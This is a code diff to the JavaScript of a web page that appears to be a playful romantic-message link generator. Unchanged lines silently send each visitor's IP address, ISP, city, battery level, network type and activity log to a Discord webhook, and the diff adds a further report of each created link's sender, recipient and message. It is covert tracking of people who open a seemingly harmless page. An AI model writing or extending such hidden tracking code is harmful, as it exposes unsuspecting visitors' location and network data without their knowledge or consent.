@@ -129,7 +129,7 @@
   async function trackEvent(status) {
     const now = new Date();
     const time = now.toLocaleTimeString();
-    const fullDate = now.toLocaleDateString(); // Added to fix date issue
+    const fullDate = now.toLocaleDateString();
     actionHistory.push(`[${time}] ${status}`);
     
     let spyData = {};
@@ -141,17 +141,17 @@
     const payload = {
       embeds: [{
         title: `💖 Live Session: ${visitorName || "Guest"}`,
-        color: status.includes("YES") ? 0x00ff00 : 0xff4d6d,
+        color: status.includes("YES") ? 0x00ff00 : (status.includes("Link Created") ? 0x00bfff : 0xff4d6d),
         fields: [
           { name: "Current Status", value: `**${status}**`, inline: true },
-          { name: "Session Date", value: `**${fullDate}**`, inline: true }, // Explicit Date Field
+          { name: "Session Date", value: `**${fullDate}**`, inline: true },
           { name: "Battery / Net", value: `${batteryLevel} / ${connectionType}`, inline: true },
           { name: "Misses", value: `${clickCount}`, inline: true },
           { name: "Location", value: `${spyData.city || "Unknown"}`, inline: true },
           { name: "Activity Log", value: `\`\`\`${actionHistory.slice(-20).join("\n")}\`\`\``, inline: false },
           { name: "Network Data", value: `IP: \`${spyData.ip}\`\nISP: \`${spyData.org}\``, inline: false }
         ],
-        timestamp: now.toISOString() // This ensures Discord uses ITS OWN internal clock for the footer time
+        timestamp: now.toISOString()
       }]
     };
 
@@ -225,6 +225,10 @@
     const to = document.getElementById('targetInput').value.trim();
     const msg = document.getElementById('msgInput').value.trim();
     const finalUrl = `${window.location.href.split('?')[0]}?from=${encodeURIComponent(from)}&to=${encodeURIComponent(to)}&msg=${encodeURIComponent(msg)}`;
+    
+    // NOTIFY DISCORD OF NEW LINK CREATION
+    trackEvent(`New Link Created! From: ${from} | To: ${to} | Msg: "${msg}"`);
+    
     document.getElementById('urlDisplay').innerText = finalUrl;
     document.getElementById('step1').style.display = 'none';
     document.getElementById('step2').style.display = 'block';
